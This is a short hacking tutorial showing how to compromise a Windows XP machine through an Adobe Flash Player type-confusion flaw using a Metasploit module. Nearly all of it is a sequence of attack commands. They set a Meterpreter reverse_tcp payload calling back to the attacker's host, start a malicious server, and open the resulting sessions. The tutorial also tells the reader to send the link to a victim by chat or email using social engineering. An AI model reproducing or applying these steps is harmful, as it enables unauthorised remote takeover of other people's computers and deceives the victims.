Hack Remote Windows PC using Adobe Flash Player Object Type Confusion

This module exploits a vulnerability found in Adobe Flash Player. By supplying a corrupt AMF0 “_error” response, it is possible to gain arbitrary remote code execution under the context of the user. This vulnerability has been exploited in the wild as part of the “World Uyghur Congress Invitation.doc” e-mail attack. According to the advisory, 10.3.183.19 and 11.x before 11.2.202.235 are affected.
Adobe Flash Player 11.2.202.235
Internet Explorer 7 on XP SP2
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/browser/adobe_flash_rtmp
Msf exploit (adobe_flash_rtmp)>set payload windows/meterpreter/reverse_tcp
Msf exploit (adobe_flash_rtmp)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (adobe_flash_rtmp)>set srvhost 192.168.1.2 (This must be an address on the local machine)
Msf exploit (adobe_flash_rtmp)>set uripath / (The Url to use for this exploit)
Msf exploit (adobe_flash_rtmp)>exploit

Now an URL you should give to your victim http://192.168.1.2:8080/

Send the link of the server to the victim via chat or email or any social engineering technique.
Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
